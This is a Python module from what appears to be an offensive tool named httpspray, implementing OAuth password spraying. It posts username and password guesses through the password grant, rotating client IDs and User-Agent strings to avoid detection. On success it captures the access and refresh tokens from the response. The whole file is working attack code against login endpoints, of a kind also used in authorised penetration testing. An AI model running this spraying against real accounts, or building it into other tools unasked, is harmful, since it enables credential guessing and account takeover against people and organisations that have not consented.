from argparse import Namespace

from requests import Response

from httpspray.module.base import BaseSpray


class OAuthSpray(BaseSpray):
    def __init__(self, opts: Namespace) -> None:
        super().__init__(opts)
        self.client_ids = opts.client_ids
        self.scope = opts.scope
        self.resource = opts.resource

    def login(self, username: str, password: str) -> Response:
        return self.session.post(
            self.target,
            data=dict(
                client_id=next(self.client_ids),
                scope=self.scope,
                username=username,
                password=password,
                grant_type='password',
                resource=self.resource,
            ),
            headers={'User-Agent': next(self.user_agents)},
        )

    def filter(self, response: Response) -> dict[str, str|None]:
        if response.status_code == 200:
            data = response.json()
            return dict(status='valid', access_token=data.get('access_token'), refresh_token=data.get('refresh_token'), scope=data.get('scope'))
        elif response.status_code == 400:
            data = response.json()
            return dict(status='invalid', error=data.get('error'), message=data.get('error_description'))
        else:
            return dict(status='unknown')
